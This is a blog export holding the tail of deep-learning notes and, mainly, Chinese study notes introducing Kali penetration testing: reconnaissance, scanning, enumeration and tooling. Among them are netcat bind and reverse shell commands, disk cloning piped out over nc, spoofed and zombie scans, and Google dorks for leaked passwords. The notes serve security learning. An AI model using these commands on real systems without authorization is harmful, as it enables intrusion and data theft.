给神经网络中添加非线性因素,提供了网络的非线性建模能力,通过定义对神经元节点输出的映射,本质上是将输入x映射到(-1,1)或者(0,1)的实数空间,即输入向量与权重的内积再加上bias经过激活函数映射处理之后再做为输出 损失函数: 使用1/2 比较好求导 自监督学习与无监督学习的本质区别 全连接层的作用: 最后将前面的隐藏层学习到的”分布式特征表示”映射到样本标记空间 卷积核的本质就是神经元间连接参数的权重 反向传播本质上是不断优化卷积核里的数值,最终提取到图像的特征 激活函数在卷积神经网络中的作用:]]></content>
      <categories>
        <category>计算机视觉(Computer Vision)</category>
        <category>论文解读</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【Kali 渗透测试】入门篇]]></title>
    <url>%2F2019%2F07%2F31%2F%E3%80%90Kali%20LInux%E3%80%91%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[作为渗透测试的第一篇文章,本文主要将带领你进行基础的渗透测试学习,若想要进一步学习可参考更多渗透测试以及黑客入侵与防御书籍 Kali Linux 从入门到精通(一)-概论 基本介绍 1.安全目标 先于攻击者发现和防止漏洞出现 攻击型安全 防护型安全 2.渗透测试 尝试挫败安全防御机制,发现系统安全弱点 从攻击者的角度思考,测量安全防护有效性 证明安全问题的存在,而非破坏 道德约束 法律 3.渗透测试标准(The Penetration Testing Execution Standard) PETS (http://www.pentest-standard.org) 前期交互阶段:需要划清范围,通常划分为多个子系统进行渗透测试 情报收集阶段:主动收集,被动收集 威胁建模阶段:逆向工程,编写针对漏洞的代码 漏洞分析阶段 渗透攻击阶段 后渗透测试阶段 渗透测试报告 4.渗透测试项目 渗透测试范围 获得授权(客户授权) 渗透测试方法 是否允许社会工程学 是否允许拒绝服务攻击 5.渗透测试误区 扫描器就是一切&lt;==只是一种手段 忽视业务逻辑重的漏洞 6.KALI Linux介绍 基于Debain的Linux发行版本 前身是BackTrack 2013年3月发布 用于渗透测试和安全审计 包含600+安全工具 FHS标准目录结构 定制内核 支持ARM和手机平台 开源免费 7.KALI LINUX 策略 ROOT用户策略 网络服务策略 更新升级策略 8.建议 实践是检验真理的唯一标准 不要停留在了解的程度 Kali很强大,但不是全部 Kali Linux 从入门到精通(二)-安装 Kail Linux 安装 持久加密USB安装-1 LUSK:Linux Unified Key Setup 磁盘分区加密规范 不依赖与操作系统的磁盘级加密 Window——-DoxBox 后端: dm-crypt 前端: crtptsetup 微软的bitlocker 将镜像刻录到U盘 dd if=kali-linux-version.iso of=/dev/sd* bs=1M(if–input file of=output file bs具体传输块的大小) 持久加密USB安装-2 为U盘创建额外分区 使用LUKS加密分区 打开加密分区 格式化加密分区+卷标 挂在加密分区,并创建persistence.conf文件 熟悉环境 登录密码:官方下载:用户root 密码为toor top10安全工具 aircrack-ng 无线安全攻击套件 brupsuite:基于web,手动web渗透测试工具,通过截断客户端到服务器的请求,通过变更数据查看漏洞 hydra:密码破解工具 john:密码破解工具 maltgo:收集信息,层级性的信息收集手段,根据有限信息,收集大量信息 metasplot framework:渗透测试框架,可以替代很多安全工具,一体化作战工具 nmap:网络发现层的扫描器,网络扫描工具 owasp-zap:与brupsuit属于一类工具 sqlmap: sql注入工具 wireshark: 抓包分析工具 字体调整 监视网络流量 强行终止程序 文件目录 共享文件 Kali 目录结构 bin:所有用户使用的执行程序目录 root: 引导程序目录:如grup dev:设备目录 etc:配置文件目录 home:用户主目录 lib: 放置各种库文件目录 lib64 lost+found: 丢失文件目录 media:挂载外接目录 mnt opt:应用程序目录 proc root sbin selinux srv sys sbin share var:日志,存放经常变动的目录 熟悉常用bash命令 ls:相当于dir ls -l: 前面字符:d 表示目录 - 表示文件 l 表示链接,相当于快捷方式 c表示设备 -b 表示块设备 ls -a: ls -lh:以k显示 ls -lh –sort==size 进行排序 cd:进入目录 cd . 表示当前目录 cd .. 进入上一级目录 pwd 当前工作目录 cd 进入用户主目录 cat:查看文件内容 more:会显示文件的百分比数 less tail 文件: 显示文件最后几行 watch -n t [命令] 每隔t秒查看信息 rm:删除文件 cp:拷贝命令 cp ps ps1 top:监视linux系统性能的命令 ps:查看进程信息 ps aux grep:grep [文件字符串或者需要的内容] 文件位置 ifconfig:查看网络信息 ifconfig eth0 down 将网卡宕掉 ifconfig eth0 up 重新启动网卡 netstat:查看网络连接信息 netstat -pautu: 进行网络连接信息 awk 管道:可对信息进行筛选,管道亦有很多命令(需掌握) mount:用来挂载的命令 dmesg:查看msg文件内容 find: find / -nmap nmap 查找文件 find . [文件] 查找当前目录中的文件 whereis [文件] -b [查找二进制执行文件] echo:显示当前文件 man指令:相当于手册 vi编辑器基本使用(后续补充) : set nu 显示行号 : wq 保存退出 管道(后续补充) | 管道符 || &amp; 前后两个命令依次执行 &amp;&amp; 逻辑与会有逻辑短路现象 shell脚本(后续补充) 123456#!/bin/bashecho -n &quot;IP : &quot;read ipecho &quot;your ip is:&quot; $ip# 使用 chmod +x 文件名.sh 更改权限 12345678910#!/bin/bash# 实现9*9乘法表for n in &apos;seq 9&apos;dofor m in &apos;seq &amp;n&apos; do echo -n &quot;$m*$n=&quot; &apos;expr $m \* &amp;n&apos;&quot; &quot; done echodone 12345# 循环发现所有活的ip地址for n in &apos;seq 254&apos;do # -c 表示只ping一个包 awk 指定第四列,对应的是ip地址 ping 192.168.1.$n -c 1 | grep ttl | awk &apos;&#123;print $4&#125;&apos; | awk -F &apos;&#123;print $1&#125;&apos; Kali Linux 从入门到精通(三)-入侵系统定制 定制 网络配置 临时IP地址 dhclient eth0 ifconfig eth0 192.168.11/24 route add default gw 192.168.1.1 # 添加默认网关 echo nameserver 192.168.1.1 &gt; /etc/resolv.conf 固定IP地址(计算机重启后依然生效) auto th0 iface th0 inel stalic address 192.168.20.1 netmask 255.255.255.0 network 192.168.20.255 broadcast 192.168.20.255 gateway 192.168.20.2 dns-nameservers 192.168.1.1 192.168.1.2 up route add -net 172.16.5.0 gw 192.168.10.100 eth1 down route del -net 172.24.0.0/24 更新升级 apt-get update: 实际上是更新的是包的索引文件 apt-get upgrade: 实际更新包的指令 安装软件包 库 apt-get 命令 安装适合自己的工具软件 apt-get install smplayer ibus ibus-pinyin flashplugin-nonfree gdebi amule qbittorrent geany stardict meld ttf-wqy-microhei kchmviewer freemind netspeed mtr filezilla filezilla-common chromium monodevelop mono-gmcs-y 浏览器插件 firefox浏览器插件 flashgof(基于浏览器插件的下载插件),autoproxy(翻墙插件),Tamper Data(提交修改),cooike,importer,Cookies Manager,Download Youtube Videos as MP4,Firebug,Flagfox(显示服务器位置),HackBar(F9进入操作),hashr(计算Hash值),User Agent Switcher(修改User Agent 可用于欺骗服务器),XSS me,SQL Inject Me xss-me:https://addons.mozilla.org/en-US/firefox/addon/xss-me/ sql-inject-me: https://addons.mozilla/en-US/firefox/sql-inject-me/src=ss Kali Linux 从入门到精通(四)-代理 翻墙&amp;代理 GFW长城防火墙 Facebook,youtube client–&gt;goagent–&gt;GAE–&gt;目标网站 翻墙 http代理:明文传输存在弊端,容易被长城防火墙发现容量,现在可以使用https进行加密 socks代理 ssh代理 VPN Goagent Tor:暗网 保护隐私防止被追踪 志愿者组成 长期在天朝无法使用 感谢云 暗网 互联网引擎无法发现 互联网黑市 代理的意义所在 加密通信 隐藏来源 突破网络封锁 注意事项 不要触及敏感地带 不要从事非法行为 Kali Linux 从入门到精通(五)-测试环境准备 准备实验环境 渗透非系统授权的弊端 搭建自己的实验环境 安装虚拟机 微软最新软件 http://msdn.microst.com/en-ca/subscriptions/aa336858 windows虚拟机 http://dev.modern.ie/tools/vms 安装自己的虚拟机(windows平台) xp Win7 2003 Linux虚拟机 http://www.turnkeylinux.org(提供Linux虚拟机,每一种都需渗透测试) Ubutu Lamp安装 sudo apt-get install ssh sudo apt-get install apache2 sudo apt-get install apache2-utile/ sudo service apache2 restart(报错解决: vi /etc/apache2/conf-available/fqdn.conf:ServerName:localhost) sudo apt-get nstall mysql-server libapache2-mod-auth-mysql php5-mysql mysql install db mysql secure installation sudo apt-get install php5 php5-mysql cd /var/www/html vi test.php sudo init 0 关机 sudo init 6 重启 sudo init 1 单用户 sudo init 2-5 多用户 Metasploitable2(务必下载) http://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip 默认账户:msfadmin 查看ip:ifconfig 问题: /var/www/multilldae/config.inc 解决措施: cd /var/www/mutillidae/ vi config.inc $dbname=”owasp10”:^n 模拟真实网络 M0n0wall 防火墙 http://m0n0.ch/wall/downloads.php (轻量级防火墙 downloads cdrom) 部署: 接外网,内网,DMZ区 256MB,8GB硬盘 m0n0虚拟机 网卡1: 桥接方式网络,连接物理网络,桥接外网 网卡2: 仅主机,虚拟网卡 网卡3: 同网卡2 无挂载,硬盘重启 背靠背防火墙(测试复杂网络架构 模拟高级企业网络拓扑) Pfense(安全性高,集成大量安全插件,防护dmz) http://pfense.org/ (类似于m0n0) Kali Linux 从入门到精通(五)-基本工具使用 基本工具 常用工具: 经常使用且功能强大 安全从业者必不可少的帮手 Nc/ncat Wireshark Tcpdump NETCAT-NC(瑞士军刀) 基本介绍 网络工具中的瑞士军刀-小身材,大智慧 侦听模式/传输模式 telnet/获取banner模式 传输文本信息 传输文件/目录 加密传输文件 远程控制/木马 加密所用流量 流媒体服务器 远程克隆硬盘 一波操作 NC-TELNET/BANNER nc-nv 1.1.1.1 110 (pop3 服务器) nc-nv 1.1.1.1 25 (smtp 邮件服务器) nc-nv 1.1.1.1 80 (网站) nc -h 查看nc可用参数 NC-传输文本信息 A:nc -l -p 4444(打开4444端口) 使用netstat -pantu | grep 4444 查看端口是否打开 B:nc -nv 1.1.1.1 4444 nc -q 传输后直接断连接 远程电子取证信息收集 NC-传输文件/目录 传输文件 A:nc -lp 333&gt;test.mp4 B:nc -nv 1.1.1.1 333 &lt; test.mp4 -q 1 or A: nc-q l -lp 333&lt;a.mp4 B: nc-nv 1.1.1.1 333&gt;2.mp4 传输目录 A:tar -cvf -music/ | nc-lp 333 -q 1 B:nc -nv 1.1.1.1 333 | tar -xvf - 加密传文件 A:nc -lp 333 | mcrypt -flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4 B:mcrypt –flush -Fbq -a rjindael-256-m ecb &lt;a.mp4 | nc -nv 1.1.1.1 333 -q 1(对称加密算法) NC-流媒体服务 A:cat 1.mp4 | nc -lp 333 B:nc -nv 1.1.1.1 333 | mplayer -vo x11 -cache 3000 - NC-端口扫描 nc -nvz 1.1.1.1-65535 (探测tcp端口) nc -nvzu 1.1.1.1-1024 (探测udp端口) NC-远程克隆硬盘 A(接收端):nc -lp 333 | dd of=/dev/sda B(被取证电脑):dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1 远程电子取证,可以将目标服务器远程复制,或者内存 NC-远程控制 正向: A(服务器):nc -lp 333 -c bash B(客户端):nc 1.1.1.1 333 反向: A:nc -lp 333 B:nc 1.1.1.1 333 -c bash 注:windows用户把bash改成cmd 适用于内网访问外网 NC-NCAT NC缺乏加密和身份验证(肉鸡可能被窃取)的能力 Ncat包含于nmap工具包中(可实现加密,身份验证,每次会重新生成指纹信息) A:ncat -c bash –allow 192.168.20.14 -vnl 333 –ssl B:ncat -nv 1.1.1.1 333 –ssl 不同系统/平台的nc参数功能不尽相同 WIRESHARK(后续补充)-被动扫描大法 基本介绍 抓包嗅探协议分析 安全专家必备的技能 抓包引擎 Libcap9—-Linux Winpcap10—Windows 解码能力(评价之根本) 基本使用方法 启动 选择抓包网卡 混杂模式 实时抓包 保存和分析捕获文件 首选项 WIRESHARK-筛选器 过滤掉干扰的数据包 抓包筛选器 显示筛选器 WIRESHARK-常见协议包 数据的分层结构 ARP ICMP TCP(三次握手) UDP DNS HTTP(明文协议) FTP WIRESHARK-TCP 数据流 HTTP SMTP POP3 SSL WIRESHARK-信息统计 节点数 协议分布 包大小分布 会话连接 解码方式 专家系统 WIRESHARK-实践 抓包对比nc,ncat加密与不加密的流量 企业抓包部署方案(采用商业化软件) Sniffer Cace/riverebed (底层基于wireshark) Cascad pilot(大流量抓包++) 镜像端口(Cisco)TCPDUMP 基本介绍 No-GUI的抓包分析工具 Linux,Unix系统默认安装 TCPDUMP-抓包 抓包 默认只抓68个字节 tcpdump -i eth0 -s 0 -2 file.pcap tcpdump -i eth0 port 22 读取抓包文件 tcpdump -r file.pcap TCPDUMP-筛选 tcpdump -n http.cap | awk ‘{print $3}’ | sort -u tcpdump -n src host [ip address] -r http.cap tcpdump -n dst host [ip address] -r http.cap tcpdump -n port 53 -r http.cap tcpdump -nX port 80 -r http.cap TCP 高级筛选 tcpdump -A -n ‘tcp[13]=24’ -r http.cap 过程文档记录 Dradis(Kali 自带) 短期临时小团队资源共享 各种插件导入问价 Keepnote Truecrypt(注重信息保密) 团队中需要文档人员 Kali Linux 从入门到精通(七)-被动信息收集 被动信息收集 公开渠道可获得的信息 与目标系统不产生直接交互 尽量避免留下一切痕迹 OSINT 美国军方 北大西洋公约组织 Passive reconnaissance(no direct interaction) normal interaction Active reconnaissance More information greater chance of direction信息收集内容 IP地址段 域名信息 邮件地址 文档图片数据 公司地址 公司组织架构 联系电话/传真号码 人员姓名/职位 目标系统使用的技术架构 公开的商业信息信息用途 用信息描述目标 发现 社会工程学攻击 物理缺口 信息收集-DNS 域名与FQDN的区别 sina.com 实际域名 www.sina.com 完全限定域名 简称为FQDN 域名记录:A(主机记录),Cname(解析成另外一个域名) NS(域的域名服务器记录),MX(邮件交换记录),ptr(不同于前面,通过ip地址解析域名 反向域名 解析) 递归查询 迭代查询DNS信息收集–NSLOOKUP nslookup www.sina.com server type=a,mx,ns,any nslookup -type example.com 156.154.70.22 text:spf 通过反向域名查询,判断,从而反垃圾邮件DNS信息收集-DIG dig @8.8.8.8 www.sina.com mx dig www.sina.com any 反向查询: dig +noall +answer -x 8.8.8.8 bind版本信息:dig +noall +answer txt chaos VERSION.BAND @ns3.dnsv4.com DNS追踪: dig +trace example.com 抓包比较递归查询,迭代查询过程的区别DNS区域传输 dig @nsl.example.com example.com axfr host -T -l sina.com 8.8.8.8DNS 字典爆破 firece -dnsserver 8.8.8.8 -dns sina.com.cn -wordlist a.txt dnsdict6 -d4 -t 16 -x sina.com dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -o sina.xml dnsrecon -d sina.com –lifetime 10 -t brt -D dnsbig.txt dnscrecon -t std -d sina.comDNS 注册信息 whois whois -h whois.apnic.net 192.0.43.10 AFRINIC APNIC ARIN IANA ICANN LACNIC NRO RIPE InterNic搜索引擎 公司新闻动态 重要雇员信息 机密文档/网络拓扑 用户名密码 目标系统软硬技术架构SHODAN 搜索联网的设备 Banner:http,ftp,ssh,telnet https://www,shodan.io/ 常见filter: net (192.168.20.1) city country(CN,US) port(80,21,22,23) os Hostname(主机或域名) server 200 OK cisco country:IP user:admin pass:password http://1.179.177.109:81/index.htm linux upnp avtech http://75.69.59.49:8000 https://account.shodan.io/ https://www.shodan.io/explore Add-OnsGoogle 搜索 + 充值 - 支付 北京的电子商务公司—北京 intitle:电子商务 intext 法人 intext 电话 阿里网站上的北京公司联系人-北京 site:alibaba.com inurl:contact 塞班司法案的PDF文档-SOX filetype.pdf 法国的支付相关页面-payment site:fr Google搜索实例 input:”level/15/exec/~/show”(交换机) intitle:”netbotz appliance””ok”(摄像头) inurl /admin/login.php(php登录界面 可爆破) inurl:qq.txt(qq号) filetype:xls “username | password” input:ftp “password” filetype:xls site:baidu.com(ftp) inurl:Service.pwd(微软漏洞) - http://exploit-db.com/google-dorks(谷歌黑客数据库)(google hacking) - 不同浏览器都有其特有的搜索语法,需熟悉 YANDEX 世界第四大搜索引擎-俄罗斯 https://www.yandex.com/ 偶尔有惊喜 用户信息 邮件,主机 theharvester -d sina.com -l 300 -b google 文件 metagoofill -d microsoft.com -t pdf -l 200 -o test -f 1.html MELTAGO(收集信息) 申请账号 登录使用其他路径 社交网络 工商注册 新闻组/论坛 招聘网站 http://www.archive.org/web/web.php(可查看不同年份的网站代码)个人专属的密码字典 按个人信息生成其专属的密码字典 CUPP-Common User Password Profiler git clone https://github.com/Mebus/cupp.git python cup.py -iMETADATA Exif图片信息(图片会记录GPS信息 默认打开) Foca RECON-NG 全特性的web侦查框架 基于Python开发 web 信息搜索框架 命令格式与msf一致 基于Python开发 使用方法: 模块 数据库 报告 DNS查询 Google Baidu Bing Yahoo Brute force 解析IP地址(查询数据库) 联系人 报告 API Kali Linux 从入门到精通(八)-主动信息收集 基本介绍 直接与目标系统交互通信 无法避免留下访问的痕迹 使用受控的第三方电脑进行探测 使用代理或已经被控制的主机 做好被封杀的准本 使用噪声迷惑目标,淹没真实的探测流量 扫描 发送不同的探测,根据返回结果判断目标状态发现 识别活着的主机 潜在的被攻击目标 输出一个IP地址列表 2,3,4层发现二层发现(渗透进目标系统后,发现内网其他信息) 优点:扫描速度快,可靠 缺点:不可路由 Arp协议:抓包二层发现–arping命令: arping arping 1.1.1.1 -c 1 arping 1.1.1.1 -d (发现重复响应, 两个不同的MAC地址拥有同一个IP,而此时IP为网关地址,此时即为ARP欺骗,实现中间人攻击,窃取密码,篡改数据等恶意参数) arping -c 1.1.1.1 | grep “bytes from” | cut -d”” -f 5 | cut -d “(“ -f 2 | cut -d”)” -f 1 脚本 arping1.sh eth0 &gt; addr arping2.sh addrs二层发现–nmap 在二层发现中的应用 nmap 1.1.1.1-254 -sn(可进行网段扫描 -sn表示不进行网段扫描) nmap -iL iplist.txt -sn(可对文本文件进行扫描) nmap很强大 后面单独介绍 二层发现–Netdiscover 专用于二层发现 可用于无线和交换环境 主动和被动探测 主动 netdiscover -i eth0 -r 1.1.1.0/24 netdiscover -l iplist.txt 被动 netdiscover -p (将网卡置于混杂模式) 主动arp容易触发报警(入侵检测系统触发报警)二层发现–Scapy 作为Python库进行调用 也可作为单独的工具使用 抓包,分析,创建.修改,注入流量 apt-get install python-gnuplot(处理报警信息) Scapy ARP().display() Sr1() Python 脚本 Arp1.py subprocess:调用操作系统 Arp2.py发现-三层发现 优点 可路由 速度比较快 缺点 速度比二层慢 经常被边界防火墙过滤 IP,ICMP协议三层发现-PING命令 Ping 1.1.1.1 -c 2 Ping -R 1.1.1.1 / tracetoute 1.1.1.1 Ping 1.1.1.1 -c 1 | grep “bytes from” | cut -d” “ -f 4 | cut -d “:” -f 1 脚本 Ping.sh 1.1.1.0三层发现-Scapy OSI多层堆叠 手工生成ICMP包/ICMP ip=IP() ip.dst=”1.1.1.1” ping=ICMP() a=sr1(ip/ping) a.display() Ping 不存在的地址 a=sr1(ip/icmp.timeout=1) a=sr1(IP(dst=”1.1.1.1”)/ICMP().timeout=1) 脚本三层发现-nmap nmap -sn 1.1.1.1-255 nmap -iL iplist.txt -sn三层发现-fping fping 1.1.1.1 -c 1 fping -g 1.1.1.1 1.1.1.2 fping -g 1.1.1.0/24 fping -f iplist.txt三层发现-Hping 能够发送几乎所有TCP/IP包 功能强大但每次只能扫描一个目标:( hping3 1.1.1.1 -icmp -c 2 for addr in$(seq 1 254):do hping3 1.1.1.$addr –icmp -c 1 &gt;&gt; handle.txt &amp; done发现-四层发现 优点: 可路由且结果可靠 不太可能被防火墙过滤 甚至可以发现所有端口都被过滤的主机 缺点: 基于状态过滤的防火墙可能过滤扫描 全端口扫描速度慢 TCP 未经过请求的ACK-RST(可用于判断主机是否存活) SYN-SYN/ACK,RST UDP ICMP端口不可达,一去不复返四层发现–Scapy(TCP发现) ACK-TCP Port–RST Scapy i=IP() i.dst=”www.baidu.com&quot; t=TCP() t.flags=’A’ r=(i/t) a=sr1(r) a.display() a=sr1(IP(dst=”www.baidu.com&quot;)/TCP(dport=80,flags=&#39;A&#39;),timeout=1)) ACK_Ping.py四层发现–Scapy(UDP发现) UDP-UDP Port-ICMP i=IP() u=UDP() u.dport=33333 r=(i/u) a=sr1(r.timeout=1,verbose=1) A.display() ICMP UDP_Ping.py UDP发现不可靠四层发现-nmap nmap 1.1.1.1-254 -PU53 -sn nmap 1.1.1.1-254 -PA80 -sn nmap -iL iplist.txt -PA80 -sn四层发现 hping3 -udp 1.1.1.1 -c 1 for addr in $(seq 1,254); do hping3 -udp 1.1.1.$addr -c 1 &gt;&gt; r.txt; done grep Unreachable.txt | cut -d” “ -f 5 | cut -d “=” -f 2 ./udp_hping.sh 1.1.1.0 hping3 1.1.1.1 -c 1 (TCP) hping3 1.1.1.1 ./TCP_hping.sh Flag 0–ACK.RST端口扫描 端口对应网服务及应用端程序 服务端程序的漏洞通过端口攻入 发现开发的端口 更具体的攻击面 攻击流程:发现活的IP-&gt;发现开发端口-&gt;通过端口漏洞攻入端口扫描之UDP端口扫描 假设ICMP port-unreachable 响应代表端口关闭 目标系统不响应ICMP port-unreachable时,可能产生误判 完整的UDP应用层请求 准确性高 耗时巨大 具体操作 Scapy UDP Scan 端口关闭:ICMP port-unreacheable 端口开放:没有回包 了解每一种基于UDP的应用层结构很有绷住 与三层相同的技术 误判 Scapy sr1(IP(dst=”1.1.1.1”)/UDP(dport=53).timeout=1,verbose=1) ./udp_scan.py 1.1.1.1 1 100端口扫描(UDP)-nmap Nmap nmap -sU 1.1.1.1 默认的1000个参数 ICMP host-unreachable nmap 1.1.1.1 -sU -p 53 nmap -iL iplist.txt -sU -p 1-220 端口扫描(TCP)-nmap TCP 端口扫描 基于连接的协议 三次握手 隐蔽扫描–syn 不建立完整连接 应用日志不记录扫描行为-隐蔽 - 僵尸扫描 - 端口开放状态: ![3cm9cq.png](https://s2.ax1x.com/2020/03/01/3cm9cq.png) - 端口状态 ![3cmCj0.png](https://s2.ax1x.com/2020/03/01/3cmCj0.png) - 极度隐蔽 - 实施条件苛刻 - 可伪造源地址 - 选择僵尸机 - 闲置系统 - 系统使用递增的IPID - 0 - 随机 - 全连接扫描 - 所有TCP扫描方式都是基于三次握手的变化来判断目标端口状态 隐蔽端口扫描 Syn-syn.ack-rst Scapy srl(IP(dst=”your ip address”)/TCP(dport=80),timeout=1,verbose=1) ./syn_scan.py namp nmap -sS 1.1.1.1 -p 80.21.25.110 443 nmap -sS 1.1.1.1 -p –65535 –open nmap -sS 1.1.1.1 -p –open nmap -sS -iL iplist.txt -p 80 hping3 hping3 1.1.1.1 –scan 80 -S hping3 1.1.1.1 –scan [ip] -S hping3 1.1.1.1 –scan 0-65535 -S hping3 -c 10 -S –spoof [伪造IP] -p ++1 1.1.1.1.3全连接端口扫描 Scapy Syn扫描不需要raw packets 内核认为syn/ack是非法包,直接发rst中断连接 全连接扫描对scapy比较困难 sr1(IP(dst=”www.baidu.com&quot;)/TCP(dport=22,flags=&#39;S&#39;)) ./tcp_scan1.py ./tcp_scan2.py iptables(Linux防火墙) -A OUTPUT -p tcp –tcp–flags RST RST -d “www.baidu.com&quot; -j DROP nmap nmap -sT 1.1.1.1 -p 80 nmap -sT 1.1.1.1 -p 80.21.25 nmap -sT 1.1.1.1 -p 80-200 nmap -sT iplist.txt -p 80 默认1000个常用端口 dmiltry 功能简单,但使用简便 默认150个最常用的端口 dmiltry -p 172.16.36.135 dmiltry -p 172.16.36.135 -o output nc nc -nv -w 1 -z [your ip address ] 1-100 for x in ${seq 20 30}; do nc -nv -w 1 -z 1.1.1.1 $x; done | grep open for x in $(seq 1 254); do nc -nv -w 1 -z 1.1.1.$x 80; done僵尸扫描(条件苛刻 需要合格的僵尸机) 合格的僵尸机:xp系统,windows 2003 server Scapy-zombie.py i=IP() t=TCP() rz=(i/f) rt=(i/t) rz[IP].dst=IPz rz[TCP].dport=445 rt[IP].src=IPz rt[IP].dst=IPt rt[TCP].dport=22 az1=sr1(rz) / at=sr1(rt) / az2=sr1(rz) az1.dsiplay() / az2.display() xp:僵尸机,metasploit:目标机,kali:扫描机 nmap 发现僵尸机 nmap -p445 www.baidu.com –script=ipideseq nse 扫描目标 nmap 172.16.36.135 -sl 172.16.36.134 -Pn -p 0-100服务扫描 识别开放端口上运行的应用 识别目标操作系统 提高攻击效率 Banner捕获 服务识别 操作系统识别 SNMP分析 防火墙识别Banner捕获 软件开发商 软件名称 服务类型 版本号 直接发现已知的漏洞和弱点 连接建立后直接获取banner 另类服务识别方法 特征行为和响应字段 不同的响应可用于识别底层操作系统 基本操作 way1: nc -nv [your ip address] way2:python socket:socket 模块用于连接网络服务 123456import socketbanner=socket.socket(socket.AF_INET,socket.SOCK_STREAM)banner.connect((&quot;www.baidu.com&quot;,21))banner.recv(4096) # 接收数据大小banner.close()exit() - Banner不允许抓取,recv无返回将挂起 - way3: - dmitry -p www.baidu.com - dmitry -pb www.baidu.com - way4: - nmap -sT [ip address] -p 22 --script=banner nse - way5: - amap -B &quot;ip address&quot; - amap -B &quot;ip address&quot; 1-65535 - amap -B &quot;ip address&quot; 1-65535 | grep on - amap [ip address] - amap [ip address] -q - amap [ip address] -qb Banner 信息抓取能力有限 nmap响应特征分析识别服务 发送系列复杂的探测 依据响应特征signature nc -nv 1.1.1.1 80 nmap 1.1.1.1 -p 80 -sV SNMP 简单网络管理协议 Community strings 信息查询或重新配置 识别和绕过防火墙筛选操作系统识别 操作系统识别技术 种类繁多 好产品采用多种技术组合 TTL起始值 Windows: 128(65-128) Linux/Unix:64 (1-64) 某些Unix:255 python脚本 from scapy.all import * win=&quot;1.1.1.1&quot; lin=&quot;1.1.1.2&quot; aw=sr1(IP(dst=win)/ICMP()) al=sr1(IP(dst=linu)/ICMP()) if al[IP].ttl&lt;64 print &quot;host is linux&quot; else print &quot;host is windows&quot; nmap使用多种技术识别操作系统 nmap 1.1.1.1 -O 系统服务特征 xprobe2 1.1.1.1 结果有误差 被动操作系统识别 IDS 抓包分析 被动扫描 p0f 结合ARP地址欺骗识别全网OS SNMP扫描 snmp(简单网络管理协议) 信息的金矿 经常被错误配置 public/private/manager MIB Tree (查用常用操作系统和设备信息) SNMP Management information Base(MIB) 树形的网络设备管理功能数据库 1.3.6.1.4.77.1.2.25 onesixtyone 1.1.1.1 public onesixtyone -c dict.txt -i hosts -o my.log -w 100 snmpwalk 1.1.1.1 -c public -v 2c 用户 snmpwalk -c public -v 2c 1.1.1.1 1.36.1.4.1.77.1.2.25 snmpcheck -t [input ip address] snmpcheck -t [input ip address] -c private -v 2 snmpcheck -t [input ip address] -w SMP 扫描 Server Message Block协议 微软历史上出现安全最多的协议 实现复杂 默认开放 文件共享 空会话未身份认证访问(SMBI) 密码策略 用户名 组名 机器名 用户,组SID nmap -v -p139,445 192.168.60.1-20 nmap 192.168.60.4 -p139,445 –script=smb-os-discovery.nse nmap -v -p139,445 –script=smb-vuln-*.nse –script-orgs=unsafe=1.1.1.1 namp:脚本位置: /usr/share/nmap/scripts nbtscan -r 192.168.60.0/24 enum4linux -a 192.168.60.10 SMTP 扫描 nc -nv 1.1.1.1 25 VRFY root nmap smtp.163.com -p25 –script=smtp-enum-users.nse –script-args=smtp-enum-users.methods={VRFY} nmap smtp.163.com -p25 –script=smtp-open-relay.nse smtp-user-enum -M VRFY -U users.txt -t 1.1.1.1 ./smtp.py防火墙识别 通过检查回包,可能识别端口是否经过防火墙过滤 设备多种多样,结果存在一定误差 scapy python 脚本 namp nmap有系列防火墙检测功能 nmap -sA 172.16.36.135 -p 22 负载均衡识别 广域网负载均衡 DNS HTTP-Loadbalancing Nginx Apache lbd www.baidu.com lbd mail.163.com WAF识别 WEB应用防火墙 wafw00f -l wafw00f http://www.microsoft.com nmap www.microsoft.com –script=http-waf-detect.nse 实际可绕过,需要使用机器学习,结合语法,词法几乎可完全避免sql等web攻击 NMPA补充(强大的扫描器) 所有参数 主机发现 sn: 不做端口扫描 Pn: 不管是否回复,扫描所有要扫的ip,再判断 PS/PA/PU/PY PE/PP//PM PO -n/-R:不做DNS解析/做解析 –dns-servers –traceroute 扫描技术 sS/sT/sWW sU (UDP扫描) scanflags sI:僵尸扫描 服务扫描(探测端口服务) sV version–intensity version-all 脚本扫描 –script-updatedb –script-help 操作系统检测 osscan-limit 限制操作系统检测 时间和性能相关 使得扫描经过一段时间进行重新扫描,不被发现 –scan-delay [time] 防火墙/IDS 欺骗,躲避 D:伪造源地址,增加噪声IP S:欺骗源地址 zenmap(图形化nmap) Kali Linux 从入门到精通(九)-弱点扫描 发现弱点 发现漏洞 基于端口服务扫描结果版本信息(速度慢) 搜索已公开的漏洞数据库(数量大) 使用弱点扫描器实现漏洞管理从信息的维度定义漏洞管理 信息收集 扫描发现网络IP,OS,服务,配置,楼栋号 能力需求:定义扫描方式内容和目标 信息管理 格式化信息,并进行筛选,分组,定义优先级 能力需求:资产分组,指定所有者,向所有者报告漏洞 信息输出 向不同层级的人群展示足够的信息量 能力需求:生成报告,导出数据,与SIEM集成弱点扫描类型 主动扫描 有身份验证 无身份验证 被动扫描 镜像端口抓包 其他来源输入 基于Agent的扫描 支持平台有限漏洞的基本概念 CVSS(Common Vulenrability Scoring System) 通用漏洞评分系统 描述安全漏洞严重程度的统一评分方案 V 3 版本—2015年6月10日 Basic Metric:基础的恒定不变的弱点权重 Temporal Metric:依赖时间因素的弱点的权重 Environment Metric:利用弱点的环境要求和实施难度的权重 CVSS CVSS是安全内容自动化协议(SCAP)的一部分 通常CVSS和CVE一同由美国国家漏洞库(NVD)发布并保持数据的更新 分值范围: 0-10 不同机构按CVSS分值的的定义威胁的中,高,低威胁级别 CVSS体现弱点的风险,威胁级别(serverity)表示弱点风险对企业的影响程度 CVSS分值是工业标准,但威胁级别不是 Vulerabilty Reference CVE(Common Vulenrable and Exposures) 已公开的信息安全漏洞字典,统一的漏洞编号标准 MITRE公司负责维护(非盈利机构) 扫描器的大部分扫描项都对应一个CVE编号 实现不同厂商之间信息交换的统一标准 CVE发布流程 发现漏洞 